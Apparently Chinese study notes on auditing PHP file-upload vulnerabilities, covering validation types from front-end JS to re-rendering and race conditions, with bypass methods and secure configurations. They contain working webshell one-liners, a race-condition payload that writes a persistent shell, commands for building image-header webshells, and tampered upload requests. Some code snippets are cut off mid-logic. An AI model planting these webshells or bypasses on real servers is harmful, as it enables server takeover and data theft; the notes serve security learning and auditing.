# 1概述
## 1.1 定义
是指 **Web 应用程序在处理用户上传文件时，服务器端未对上传的文件进行严格的安全校验**，导致攻击者可以上传恶意文件（如 WebShell）到服务器，从而实现对服务器的控制。

- **正常的文件上传流程**
```
用户选择文件
     ↓
客户端（浏览器）发送 HTTP 请求
     ↓
服务端接收文件数据
     ↓
服务端保存文件到指定目录
     ↓
返回上传结果给用户
```

- **存在漏洞时的流程**
```
攻击者构造恶意文件（如 shell.php）
     ↓
绕过或不存在的安全校验
     ↓
恶意文件被保存至服务器可访问目录
     ↓
攻击者访问该文件 URL，触发服务端执行
     ↓
获取 WebShell / 服务器控制权
```

- **简单的漏洞示例**
存在漏洞的上传代码（无任何校验）：
```
<?php
$uploadDir  = 'uploads/';
$uploadFile = $uploadDir . basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile);
echo "上传成功，路径为：" . $uploadFile;
?>
```
恶意文件 `shell.php`：
```
<?php @eval($_POST['cmd']); ?>
```
攻击结果：
```
访问：http://target.com/uploads/shell.php
POST 参数：cmd=system('whoami');

服务器返回：www-data
→ 攻击者已获得命令执行权限
```
## 1.2 危害与影响

- **危害**

| 危害类型            | 说明                       |
| --------------- | ------------------------ |
| **获取 WebShell** | 上传 PHP/ASP/JSP 木马，远程执行命令 |
| **服务器沦陷**       | 通过 WebShell 提权，控制整台服务器   |
| **内网渗透**        | 以服务器为跳板，渗透内网其他系统         |
| **数据泄露**        | 读取数据库配置、敏感文件、用户数据        |
| **网页篡改**        | 上传恶意 HTML/JS，替换正常页面      |
| **XSS 攻击**      | 上传含恶意脚本的 SVG/HTML 文件     |
| **钓鱼攻击**        | 上传伪造页面，用于钓鱼欺诈            |
| **拒绝服务**        | 上传超大文件，耗尽服务器存储/内存        |
| **SSRF 利用**     | 结合 SSRF 探测内网服务           |

- **攻击链示意**
```
文件上传漏洞
                         ↓
                   上传 WebShell
                         ↓
                   命令执行权限
                         ↓
        ┌────────────────┼────────────────┐
        ↓                ↓                ↓
   读取敏感信息       权限提升          持久化后门
   ├─ 数据库配置    ├─ 本地提权        ├─ 计划任务
   ├─ 源代码        ├─ SUID 提权      ├─ SSH 公钥
   └─ /etc/passwd  └─ 内核漏洞        └─ 隐藏账户
        ↓                ↓                ↓
        └────────────────┼────────────────┘
                         ↓   (以后)
                   内网横向移动
                   ├─ 内网扫描
                   ├─ 攻击内网服务
                   └─ 域渗透
                         ↓
                 ┌───────┴───────┐
                 ↓               ↓
            数据窃取          勒索/挖矿
```
## 1.3 产生原因
- 服务器配置不当
- 开源编辑器上传漏洞
- 本地文件上传限制被绕过
- 过滤不严格被绕过
- 文件解析漏洞导致文件执行
- 文件路径截断
## 1.4 利用的前提条件
```
-─────────────────────────────────────────────────────
  
    要素一           要素二              要素三            
  
  文件能够          文件能够            文件能够            
  上传成功    →     被访问到      →      被执行               
  
  突破校验机制      知道路径            目录有执行权限        
                  路径可访问           后缀被正确解析           

──────────────────────────────────────────────────────
```
- **要素一**（能上传）all
    - 能够绕过前端 JS 校验 
    - 能够绕过 Content-Type 校验 
    - 能够绕过扩展名校验（黑名单/白名单）
    - 能够绕过文件内容校验（文件头/getimagesize） 
    - 文件被实际写入磁盘（而非仅在内存中处理） 
    - 上传的文件内容未被完全破坏（如二次渲染)

- **要素二**（能访问）all
    - 知道文件存储路径
     ├─ 服务器返回了路径
      ├─ 路径规律可猜测（如 /uploads/ + 原始文件名）
      └─ 通过目录遍历或其他方式获取路径

    - 上传目录在 Web 根目录内
     ├─ /var/www/html/uploads/  ✅ 可访问
      └─ /tmp/uploads/                   ❌ 不可直接访问，得LFI

    - 目录没有访问权限限制
     ├─ 没有 .htaccess 禁止访问
      └─ 没有 Nginx/Apache 的 deny 规则

    - 文件名未被完全随机化（或能预测出随机文件名）

- **要素三**（能执行）满足其一
    - 条件A：文件扩展名被 Web 服务器识别为可执行脚本
     **.php**  → PHP 解释器处理  ✅
      **.jsp**  → JVM 处理              ✅
      **.txt**  → 直接返回文本         ❌

    - 条件B：上传目录没有禁止脚本执行的配置
      正常上传目录应配置：php_flag engine off
      未配置 → .php 文件可被执行 ✅（对攻击者有利）
      已配置 → .php 文件无法执行 ❌（对攻击者不利）

    - 条件C：利用服务器解析漏洞（即使扩展名不是 .php）
      Apache 多后缀：shell.php.jpg 被当作 PHP 解析
      Nginx 路径解析：shell.jpg/.php 被当作 PHP 解析
      IIS 分号截断：shell.asp;.jpg 被当作 ASP 解析

**实际利用思考链**
```
Step 1：能传上去吗？
  → 分析校验机制 → 找对应绕过方法（见第3、4章）
         ↓
Step 2：传上去之后在哪里？
  → 分析存储逻辑 → 确定文件路径是否可知
         ↓
Step 3：能访问到吗？
  → 确认目录在 Web 根目录下 → 确认没有访问限制
         ↓
Step 4：能执行吗？
  → 确认目录有执行权限 → 确认扩展名能被解析
  → 若不能：利用解析漏洞 / 结合文件包含漏洞
         ↓
Step 5：执行后能做什么？
  → WebShell → 命令执行 → 提权
```

# 2审计方法轮
## 2.1 审计总体思路与流程
>这里写的白痴点了😋

- **什么是代码审计**
代码审计（Code Audit）是指通过**阅读源代码**，主动发现程序中存在的安全漏洞的过程。针对文件上传漏洞的审计，核心目标是
```
找到上传功能的代码实现
        ↓
判断其中存在哪些安全缺陷
        ↓
确认缺陷是否可被实际利用
        ↓
制定具体的利用或修复方案
```

- **审计的两种视角**
```
视角一：攻击者视角（找漏洞）
  目标：找到可以被绕过的校验逻辑
  关注：能不能传上去 / 能不能访问 / 能不能执行
  产出：可用的利用方案（Exploit）

视角二：防御者视角（修漏洞）
  目标：找到所有存在缺陷的校验逻辑
  关注：每一处校验是否严格、是否完整、是否可绕过
  产出：修复建议与安全加固方案
```

- **总体审计流程**
```
拿到源码
   ↓
第一步：定位上传入口
   → 找到处理文件上传的核心代码位置
   ↓
第二步：审计校验逻辑
   → 判断对上传文件做了哪些检查、检查是否严格
   ↓
第三步：审计存储逻辑
   → 判断文件存到哪里、路径是否可知、是否可执行
   ↓
第四步：综合判断
   → 对照漏洞类型，确定能否利用、如何利用
```
## 2.2 第一步：定位上传入口
> 拿到一个项目的源码，第一件事不是从头开始读，而是**直接搜索危险函数**，快速锁定上传功能的位置。
### 2.2.1 PHP 核心危险函数速查

#### `move_uploaded_file()`
>最核心的定位目标

```php
move_uploaded_file(string $from, string $to): bool
```

- **参数说明**
    - `$from`：临时文件路径（`$_FILES['file']['tmp_name']`）
    - `$to`：  目标存储路径（这里决定了文件存到哪里）

看到这个函数找到了文件上传的<u>核心处理位置</u>，立刻重点审计此函数前面的所有校验逻辑

**示例：**
```php
move_uploaded_file($_FILES['file']['tmp_name'], $destination);
                                                    ↑
                          重点看这个 $destination 是怎么来的
                          是拼接的用户输入？还是固定路径？
```

#### `$_FILES` 数组
>数据来源与可信度

```php
// 文件上传后，PHP 将所有信息存入 $_FILES 数组
// 假设表单字段名为 "file"：

$_FILES['file']['name']      // 原始文件名（用户提交，完全不可信）
$_FILES['file']['type']      // MIME 类型（用户提交，完全不可信）
$_FILES['file']['tmp_name']  // 临时文件路径（服务器生成，可信）
$_FILES['file']['size']      // 文件大小（字节，基本可信）
$_FILES['file']['error']     // 错误码（0 = 上传成功）

// 重要标注：
// ┌─────────────────────┬──────────────────────────────┐
// │ 字段                │ 可信度说明                    │
// ├─────────────────────┼──────────────────────────────┤
// │ name                │ ❌ 攻击者完全可控，不可信      │
// │ type                │ ❌ 攻击者完全可控，不可信      │
// │ tmp_name            │ ✅ 服务器生成，可信            │
// │ size                │ ⚠️  基本可信，但可伪造         │
// │ error               │ ✅ 服务器生成，可信            │
// └─────────────────────┴──────────────────────────────┘

外层的['file']：对应前端 <input type="file" name="file"> 里的 name 属性值。是给文件输入框起的名字
  
内层的['tmp_name']：是 PHP 给上传文件分配的 临时文件名 / 临时存储路径
```

#### `file_put_contents()`
>一种形式的上传

```php
file_put_contents(string $filename, mixed $data): int|false
```
虽然不是传统意义上的文件上传函数，但如果写入的内容来自用户输入(即`$filename`和`$data`是否包含用户可控内容)，危害与文件上传漏洞等同
```
// 危险场景示例：
$content = $_POST['content'];           // 内容来自用户输入
$filename = $_POST['filename'];         // 文件名来自用户输入
file_put_contents($filename, $content); // 任意文件写入漏洞！
```
审计时重点关注：
1. $data 是否包含用户可控内容
2. $filename 是否包含用户可控内容
两个条件只要满足其一且未做限制，就可能存在漏洞

#### `fwrite()`
>底层文件写入

```php
// fwrite 通常配合 fopen 使用
$handle = fopen($path, 'w');
fwrite($handle, $content);
fclose($handle);

// 审计方式与 file_put_contents 相同
// 关注 $path 和 $content 是否有用户输入参与
```

#### 图片处理函数
>二次渲染场景

```php
// 这类函数本身是安全的，但结合上传漏洞时需要特殊处理
imagepng($image, $destination);    // 保存 PNG
imagejpeg($image, $destination);   // 保存 JPEG
imagegif($image, $destination);    // 保存 GIF

// 审计关注点：
// 重新生成的图片是否真正清除了恶意代码？
// 还是代码被嵌入到了不会被渲染影响的数据块中？
```

## 2.3 第二步：审计校验逻辑（检测）
> 找到上传入口后，核心任务是**向上回溯，分析校验逻辑**
> 判断：校验了什么？校验是否严格？是否存在绕过空间？

### 2.3.1 五个必问问题（审计框架）
```
拿到上传相关代码，依次问自己这五个问题：

Q1：有没有进行任何校验？
    → 没有 = 无防御型，直接传 Shell

Q2：校验发生在哪里？
    → 客户端（JS）= 抓包绕过
    → 服务端     = 继续分析

Q3：校验的是什么内容？
    → Content-Type？扩展名？文件头？内容？
    → 对应不同的绕过方式

Q4：校验逻辑是否严格完整？
    → 黑名单是否完整？
    → 大小写是否统一处理？
    → 是否有逻辑漏洞？

Q5：校验和存储的顺序是什么？
    → 先校验后存储 = 正常流程
    → 先存储后校验 = 可能存在条件竞争
```

### 2.3.2 无校验型

- **特征识别**
```php
<?php
// 特征：从接收 $_FILES 到 move_uploaded_file
// 中间没有任何 if 判断或过滤逻辑

$uploadDir  = 'uploads/';
$uploadFile = $uploadDir . $_FILES['file']['name'];  // 直接用原始文件名
move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile);
echo "上传路径：" . $uploadFile;
?>
```

- **审计要点**
```
✅ 识别标志：
   move_uploaded_file 前没有任何条件判断
   直接使用 $_FILES['file']['name'] 作为文件名

✅ 危害等级：最高（直接上传任意文件）

✅ 利用方式：直接上传 shell.php，无需任何绕过
```

### 2.3.3 前端 JS 校验型

- **特征识别**
    - **提交**
    - **input change事件校验**
    - **getElementBy**
```javascript
// 特征：在 HTML 页面源码中找到类似的 JS 校验代码
// 而 PHP 后端完全没有对应的校验逻辑

// 常见写法一：表单提交时校验
function checkFile() {
    var file = document.getElementById('file').value;
    var ext  = file.substring(file.lastIndexOf('.') + 1).toLowerCase();
    var allowed = ['jpg', 'png', 'gif'];
    if (allowed.indexOf(ext) === -1) {
        alert('只允许上传图片！');
        return false;
    }
    return true;
}
// <form onsubmit="return checkFile()">

// 常见写法二：input change 事件校验
document.getElementById('file').addEventListener('change', function() {
    var fileName = this.files[0].name;
    var ext = fileName.split('.').pop();
    if (ext !== 'jpg' && ext !== 'png') {
        alert('文件类型不允许');
        this.value = '';  // 清空选择
    }
});
```

- **审计要点**
```
✅ 识别标志：
   PHP 源码无任何校验
   HTML/JS 中有文件类型判断

✅ 为什么不可靠：
   JS 运行在客户端浏览器中
   攻击者可以：
   → F12直接删除或修改 JS 代码
   → 用 Burp Suite 抓包，在数据到达服务器前修改
   → 绕过浏览器直接用 curl/Python 发送请求

✅ 绕过方式：
   方法1：Burp 抓包 → 修改文件名后缀为 .php
   方法2：浏览器 F12 → 删除 onsubmit 事件
   方法3：直接用 curl 发送请求（不经过浏览器）
```

- **比喻理解**
```
以前端进行后缀检验，我们用BP修改绕过为例：

- 小区门口保安（前端）只看 “你拿的是购物袋（.jpg）” 就放你进
  
- 你进小区后，在半路把购物袋换成了装有危险物品的包（.php）[BP修改]
  
- 小区仓库管理员（服务器）不检查你拿的是什么，只看 “保安放进来的，就收下”
  
- 最终危险物品被存进仓库，出了问题。
```
### 2.3.4 Content-Type 校验型

- **特征识别**
    - **直接对比**
    - **in_array判断**
```php
<?php
// 特征：只判断 $_FILES['file']['type']，没有其他校验

$allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];

// 写法一：直接比对
if ($_FILES['file']['type'] !== 'image/jpeg') {
    die('只允许上传 JPEG 图片');
}

// 写法二：in_array 判断
if (!in_array($_FILES['file']['type'], $allowedTypes)) {
    die('文件类型不允许');
}

move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

- **审计要点**
```
✅ 识别标志：
   校验条件中出现 $_FILES['file']['type']
   且没有其他针对扩展名或文件内容的校验

✅ 为什么不可靠：
   $_FILES['file']['type'] 来自 HTTP 请求中的 Content-Type 字段
   这个字段由客户端（攻击者）完全控制，服务器无法验证真实性

✅ 绕过方式：
   Burp 抓包 → 找到请求中的 Content-Type 字段 → 改为 image/jpeg
   
   修改前：
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Type: application/x-php              ← 改这里
   
   修改后：
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Type: image/jpeg                     ← 改成这个即可绕过
```
### 2.3.5 黑名单扩展名校验型

- **特征识别**
     - **pathinfo获取扩展名**
     - **字符串截取**
     - **explode截取**
     - **黑名单对比**
     - **str_replace后缀替换（双写绕过）**
     - **strrchr特殊后缀绕过**  strrchr($file_name, '.')提取最后一个后缀
```php
<?php
// 特征：获取扩展名，与黑名单数组对比

// 写法一：pathinfo 获取扩展名
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);

// 写法二：字符串截取
$ext = substr($_FILES['file']['name'], strrpos($_FILES['file']['name'], '.') + 1);

// 写法三：explode 分割
$ext = end(explode('.', $_FILES['file']['name']));

// 黑名单对比
$blacklist = ['php', 'asp', 'aspx', 'jsp', 'sh'];
if (in_array($ext, $blacklist)) {
    die('该文件类型不允许上传');
}

move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

- **审计要点与绕过方向**
    - **大小写strtolower**
    - **后缀黑名单**
    - **.htacess / .user.ini**
    - **点(.)和空格( )** windows特有
```
审计时逐项检查以下问题：
```

### 2.3.6 白名单扩展名校验型

- **特征识别**
```php
<?php
// 特征：只允许白名单内的扩展名通过

$ext       = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$whitelist = ['jpg', 'jpeg', 'png', 'gif'];

    die('只允许上传图片文件');

move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
?>
```

- **审计要点与绕过方向**
     - **PHP版本<5.3.4 %00截断**
     - **存储路径与原始名的关系**
     - **文件包含漏洞**
     - **二次渲染**

### 2.3.7 文件头校验型

- **特征识别**
    - getimagesize()
    - **exif_imagetype**
    - **读取文件头字节**
```php
<?php
// 特征：使用函数检测文件内容是否为合法图片

// 写法一：getimagesize
$imageInfo = getimagesize($_FILES['file']['tmp_name']);
if ($imageInfo === false) {
    die('请上传合法的图片文件');
}

// 写法二：exif_imagetype
if (exif_imagetype($_FILES['file']['tmp_name']) === false) {
    die('不是有效的图片格式');
}

// 写法三：读取文件头字节
$file    = fopen($_FILES['file']['tmp_name'], 'rb');
$header  = fread($file, 4);
fclose($file);
if (substr($header, 0, 3) !== "\xFF\xD8\xFF") {  // JPEG 文件头
    die('文件格式不正确');
}
?>
```

- **常见文件格式的魔术字节**
```
文件类型    文件头（十六进制）          ASCII 表示
────────────────────────────────────────────────────
JPEG        FF D8 FF E0                 ÿØÿà
PNG         89 50 4E 47 0D 0A 1A 0A    .PNG....
GIF87a      47 49 46 38 37 61          GIF87a
GIF89a      47 49 46 38 39 61          GIF89a      ← 最常用于绕过
BMP         42 4D                       BM
PDF         25 50 44 46                %PDF
ZIP         50 4B 03 04                PK..
```

- **审计要点与绕过方向**
```
核心缺陷：
getimagesize() 和 exif_imagetype() 只检测文件头部
不检测文件中间和末尾的内容

绕过方式：
在文件头加上合法的图片魔术字节，后面跟 PHP 代码

GIF 格式（最简单）：
  内容：GIF89a<?php @eval($_POST['cmd']); ?>
  → GIF89a 是合法的 GIF 文件头
  → getimagesize 检测到合法文件头，校验通过
  → 如果能让服务器以 PHP 解析此文件，代码被执行

更完整的图片马（JPEG）：
  方法：用正常 JPEG 图片，在末尾或注释段追加 PHP 代码
  命令：copy normal.jpg /b + shell.php /a shell.jpg
  → 文件头是合法 JPEG，校验通过
  → 配合解析漏洞或文件包含漏洞执行
```

### 2.3.8 二次渲染校验型

- **特征识别**
    - **imagecreatefromjpeg**
```php
<?php
// 特征：上传后用 GD 库重新处理图片，再保存

$info = getimagesize($_FILES['file']['tmp_name']);

// 根据图片类型重新生成
switch ($info['mime']) {
    case 'image/jpeg':
        $img = imagecreatefromjpeg($_FILES['file']['tmp_name']);
        imagejpeg($img, 'uploads/' . $newName, 90);    // 重新生成 JPEG
        break;
    case 'image/png':
        $img = imagecreatefrompng($_FILES['file']['tmp_name']);
        imagepng($img, 'uploads/' . $newName);          // 重新生成 PNG
        break;
    case 'image/gif':
        $img = imagecreatefromgif($_FILES['file']['tmp_name']);
        imagegif($img, 'uploads/' . $newName);          // 重新生成 GIF
        break;
}
imagedestroy($img);
?>
```

- **审计要点**
```
为什么二次渲染能防御？
  GD 库处理图片时：
  1. 读取原始图片的像素数据
  2. 用像素数据重新生成一张新图片
  3. 原始文件中附加的 PHP 代码（像素数据以外的部分）被丢弃

但仍然有绕过可能？
  不同图片格式的数据结构不同：
  ├─ GIF：帧数据结构中有部分区域在渲染后保持不变
  │       → 在不变区域写入 PHP 代码，渲染后代码仍存在
  ├─ PNG：PLTE 调色板数据块和 IDAT 像素块有可利用区域
  └─ JPEG：Comment 注释段在某些情况下不会被清除

  关键：需要将代码写入渲染后不会被修改的特定数据块
  → 通常需要专门的脚本处理（见第4章）

审计结论：
  如果只有二次渲染，没有配合文件包含漏洞 → 实际危害有限
  如果同时存在文件包含漏洞 → 二次渲染绕过后仍可利用
```

### 2.3.9 条件竞争型
>例题可见MoeCTF 第十五章 归真关·竞时净魔

- **特征识别**
```php
<?php
// 特征：核心标志是 move_uploaded_file 在安全校验之前执行

// ① 先无条件保存文件
$dest = 'uploads/' . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $dest);  // ← 先存

// ② 再进行安全检查
$ext = pathinfo($dest, PATHINFO_EXTENSION);
if (!in_array($ext, ['jpg', 'png', 'gif'])) {
    unlink($dest);   // ← 后删
    die('不允许的文件类型');
}

echo '上传成功';
?>
```

- **审计要点**
    - **关键：move_uploaded_file 在 if 校验之前执行**
```
核心漏洞：文件存在于磁盘的时间窗口

时间线：
  T1：move_uploaded_file 执行 → 文件写入磁盘
  T2：安全校验执行（检测文件类型）
  T3：unlink 执行 → 文件被删除

  T1 到 T3 之间存在一个时间窗口
  窗口大小：通常微秒到毫秒级别

利用方式：
  线程A（持续上传）：不断发送上传 shell.php 的请求
  线程B（持续访问）：不断发送访问 /uploads/shell.php 的请求

  当线程B的访问恰好落在 T1~T3 之间：
  → shell.php 存在于磁盘上
  → 访问触发执行
  → PHP 代码被解析运行

更稳定的利用方式：
  上传的 shell.php 内容不是直接的木马
  而是写文件的代码：

<?php 
fputs(fopen('pass.php','w'),'<?php @eval($_POST["cmd"]); ?>'); 
?>

  → 一旦在窗口期被执行
  → 会在服务器上生成一个永久存在的 shell
  → 即使原来的 shell.php 被删除，pass.php 仍然存在

识别关键：
  move_uploaded_file 是否在 if 校验之前执行？
  → 是 → 存在条件竞争漏洞
  → 否 → 不存在此漏洞
```
**这上面写了条件竞争payload**

## 2.4 第三步：审计存储逻辑
> 校验逻辑审计完后，还要分析文件被保存后的状态
> 判断：**文件存到哪里？能不能访问？能不能执行？**

### 2.4.1 文件名是否可预测
- **原始文件名**
- **时间戳**
- **微秒时间戳**
- **MD5随机**
- **完全随机**
```php
<?php
// 情况一：直接使用原始文件名（完全可预测）
$filename = $_FILES['file']['name'];
// 上传 shell.php → 存储为 shell.php
// 访问路径直接可知：http://target.com/uploads/shell.php

// 情况二：时间戳命名（可预测）
$filename = time() . '.' . $ext;
// 存储为 1701234567.php
// 攻击者可以根据上传时间推算文件名

// 情况三：微秒时间戳（较难预测但非不可能）
$filename = microtime(true) . '.' . $ext;

// 情况四：MD5 随机命名（难预测，但服务器返回路径则可知）
$filename = md5(uniqid(rand(), true)) . '.' . $ext;
echo '文件已上传：uploads/' . $filename;  // ← 直接告诉攻击者！

// 情况五：完全随机且不返回路径（最安全）
$filename = md5(uniqid(rand(), true)) . '.' . $ext;
// 不返回路径，不输出任何与路径相关的信息
// 攻击者无法猜测文件名 → 无法访问 → 无法利用

// 审计结论：
// 文件名可预测 OR 服务器返回了路径 → 满足可访问条件
// 文件名完全随机且不返回       → 可访问性大幅降低
?>
```

### 2.4.2 存储路径是否在 Web 根目录下

```php
<?php
// ✅ 在 Web 根目录内（可访问）
move_uploaded_file($tmp, 'uploads/' . $name);
// 相对路径 = 相对于当前脚本
// 若脚本在 /var/www/html/upload.php
// 则实际路径：/var/www/html/uploads/$name
// 对应 URL：http://target.com/uploads/$name

move_uploaded_file($tmp, '/var/www/html/uploads/' . $name);
// 绝对路径，明确在 Web 根目录内
// 对应 URL：http://target.com/uploads/$name

// ❌ 在 Web 根目录外（不可直接访问）
move_uploaded_file($tmp, '/tmp/uploads/' . $name);
// /tmp 不在 Web 根目录 /var/www/html/ 内
// 无法通过 URL 直接访问

move_uploaded_file($tmp, '../storage/' . $name);
// 上级目录的 storage 文件夹
// 若脚本在 /var/www/html/ 则存到 /var/www/storage/
// 不在 Web 根目录内，无法直接访问

// 审计方法：
// 找到 move_uploaded_file 的第二个参数
// 判断最终的物理路径是否在 /var/www/html/（或对应的 Web 根目录）内
?>
```

### 2.4.3 是否返回了文件路径

```php
<?php
// 危险：直接返回完整路径
echo '上传成功，文件路径：' . $uploadPath;

// 危险：JSON 响应中包含路径
echo json_encode(['success' => true, 'path' => $uploadPath]);

// 危险：重定向到上传后的文件
header('Location: ' . $uploadPath);

// 危险：路径写入 HTML（如图片预览）
echo '<img src="' . $uploadPath . '">';

// 较安全：只返回成功/失败，不返回路径
echo '上传成功';
echo json_encode(['success' => true]);

// 审计结论：
// 只要响应中包含了文件路径信息（完整路径或相对路径）
// 攻击者就能知道上传文件的访问地址
?>
```

### 2.4.4 上传目录是否禁止脚本执行
>如果题目上传代码本身就存在.htacess，则这个题上传直接就禁止脚本执行
```php
<?php
// PHP 代码中有时会检查并设置目录配置
// 但更多时候这是 Web 服务器配置层面的事情

// 代码层面：检查 .htaccess 是否存在
if (!file_exists('uploads/.htaccess')) {
    file_put_contents('uploads/.htaccess', 
        "Options -ExecCGI\nAddHandler cgi-script .php .py\n");
}
// 说明开发者有意识地保护了上传目录

// 审计时需要同步检查服务器配置文件：
?>
```
>**engine off**会直接禁用PHP引擎
```apache
# 检查 Apache 配置或上传目录下的 .htaccess

# 安全配置（有这些 = 上传目录禁止执行）：
Options -ExecCGI
AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi
php_flag engine off        ← 这行最关键，直接禁用 PHP 引擎

# 没有上述配置 = 上传目录可执行 PHP = 危险
```

```nginx
# 检查 Nginx 配置中是否有针对上传目录的特殊规则

# 安全配置：
location /uploads/ {
    location ~ \.(php|py|sh)$ {
        deny all;              ← 禁止访问上传目录中的脚本文件
    }
}

# 没有上述配置 = 由全局 PHP 解析规则处理 = 上传目录可执行 PHP
```

# 3. 文件上传的校验机制详解
## 3.1 客户端校验（前端 JS 校验）
### 3.1.1 校验原理与实现方式×4
前端校验通常在文件被提交到服务器**之前**，由**浏览器执行 JavaScript 代码**完成拦截。

- **常见实现方式一：`accept` 属性限制**
```html
<!-- 仅在文件选择对话框中过滤显示，但不阻止手动输入其他类型 -->
<input type="file" accept=".jpg,.jpeg,.png,.gif">
```
> ⚠️ `accept` 属性仅影响文件选择器的显示过滤，**不提供任何安全保障**。

- **常见实现方式二：JS 监听 `change` 事件校验扩展名**
```javascript
document.getElementById('fileInput').addEventListener('change', function(e) {
    const file = e.target.files[0];
    const fileName = file.name;
    const ext = fileName.substring(fileName.lastIndexOf('.') + 1).toLowerCase();
    
    const allowedExts = ['jpg', 'jpeg', 'png', 'gif'];
    
    if (!allowedExts.includes(ext)) {
        alert('不允许上传该类型文件！');
        this.value = ''; // 清空文件选择
        return false;
    }
});
```

- **常见实现方式三：校验 MIME 类型（`file.type`）**
```javascript
const file = e.target.files[0];
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];

if (!allowedTypes.includes(file.type)) {
    alert('文件类型不允许！');
    return false;
}
```
> `file.type` 的值由**浏览器根据文件扩展名推断**，并非读取文件真实内容。

- **常见实现方式四：FileReader 读取文件头**
较少见，但部分开发者会尝试在前端读取 Magic Bytes：
```javascript
const reader = new FileReader();
reader.onload = function(e) {
    const arr = new Uint8Array(e.target.result).subarray(0, 4);
    // 判断是否为 JPEG: FF D8 FF
    if (arr[0] === 0xFF && arr[1] === 0xD8 && arr[2] === 0xFF) {
        console.log('检测为 JPEG 图片');
    }
};
reader.readAsArrayBuffer(file.slice(0, 4));
```
### 3.1.2 为什么前端校验不可靠
>前端校验的**根本性缺陷**在于：所有代码运行在用户可控的浏览器环境中。

## 3.2 服务端校验

### 3.2.1 MIME 类型校验（Content-Type）
有详解

- **原理**
HTTP 上传请求中，`multipart/form-data` 格式的每个字段都携带 `Content-Type` 头，服务端读取该字段判断文件类型。

**HTTP 请求包示意：**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          ← 服务端读取此值进行判断

<?php @eval($_POST['cmd']); ?>    ← 实际文件内容是 PHP 代码
------WebKitFormBoundary7MA4YWxk--
```

- **服务端实现代码（PHP）**
```php
<?php
$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];

// $_FILES['file']['type'] 直接来自 HTTP 请求头，完全由客户端控制
$uploadedMime = $_FILES['file']['type'];

if (!in_array($uploadedMime, $allowedMimes)) {
    die('错误：不允许的文件类型！');
}

// 校验通过，保存文件
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
echo '上传成功';
?>
```

- **绕过演示：**
```http
# 原始恶意请求 → Burp 修改 Content-Type 后发送
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← 修改为合法 MIME，服务端校验通过

<?php system($_GET['cmd']); ?>
```

### 3.2.2 文件扩展名校验

#### 黑名单机制原理与缺陷

**原理：** 维护一个"危险扩展名"列表，拒绝列表内的扩展名。

```php
    die('禁止上传该类型文件！');

```

**黑名单的本质缺陷：** 无法穷举所有危险扩展名

### 3.2.3 文件头校验
>直接读取文件的**二进制数据**进行判断

#### 文件头魔术字节原理
每种文件格式在二进制层面有固定的**文件头标识**，称为 Magic Bytes 或 Magic Number。

- **常见文件格式 Magic Bytes：**
```
┌────────────┬──────────────────────────────┬─────────────────────────┐
│  文件类型   │  Magic Bytes (Hex)            │  ASCII 表示              │
├────────────┼──────────────────────────────┼─────────────────────────┤
│  JPEG      │  FF D8 FF                    │  ÿØÿ                    │
│  PNG       │  89 50 4E 47 0D 0A 1A 0A    │  .PNG....               │
│  GIF87a    │  47 49 46 38 37 61           │  GIF87a                 │
│  GIF89a    │  47 49 46 38 39 61           │  GIF89a                 │
│  PDF       │  25 50 44 46                 │  %PDF                   │
│  ZIP       │  50 4B 03 04                 │  PK..                   │
│  EXE/DLL   │  4D 5A                       │  MZ                     │
│  PHP       │  3C 3F 70 68 70              │  <?php                  │
└────────────┴──────────────────────────────┴─────────────────────────┘
```

- **PHP 手动读取 Magic Bytes 校验：**
```php
<?php
function checkMagicBytes($filePath) {
    $allowedSignatures = [
        'jpeg' => "\xFF\xD8\xFF",        // 3字节
        'png'  => "\x89PNG\r\n\x1a\n",  // 8字节
        'gif'  => 'GIF87a',              // 6字节
        'gif2' => 'GIF89a',
    ];
    
    // 读取文件前8个字节
    $handle = fopen($filePath, 'rb');
    $bytes  = fread($handle, 8);
    fclose($handle);
    
    foreach ($allowedSignatures as $type => $sig) {
        if (strncmp($bytes, $sig, strlen($sig)) === 0) {
            return true; // 匹配到合法文件头
        }
    }
    return false;
}

$tmpFile = $_FILES['file']['tmp_name'];

if (!checkMagicBytes($tmpFile)) {
    die('文件内容校验失败：非法文件格式');
}
```

- **绕过 Magic Bytes 校验：**
攻击者可以在 WebShell 前面**插入合法的文件头**：
```
# 构造绕过文件：合法图片头 + PHP 代码
FF D8 FF E0 ...（JPEG 文件头）... <?php system($_GET['cmd']); ?>
```

```bash
# 命令行生成带图片头的 WebShell
echo -e '\xFF\xD8\xFF' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# 或使用 Python
python3 -c "
with open('shell.php','wb') as f:
    f.write(b'\xFF\xD8\xFF')           # JPEG 魔术字节
    f.write(b'<?php system(\$_GET[\"cmd\"]); ?>')
"
```
如果服务器仅校验 Magic Bytes 而不校验文件完整结构，此类"图片马"可以轻松绕过。

#### `getimagesize()` 校验原理
>`getimagesize()` 是 PHP 内置函数，读取图片文件并返回图像属性信息（宽、高、类型、MIME 等）。

```php
<?php
$tmpFile = $_FILES['file']['tmp_name'];

// 返回数组，若非图片则返回 false
$imageInfo = getimagesize($tmpFile);

if ($imageInfo === false) {
    die('校验失败：不是有效的图片文件');
}

// 可进一步检查 MIME 类型
$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($imageInfo['mime'], $allowedMimes)) {
    die('图片类型不在允许范围内');
}

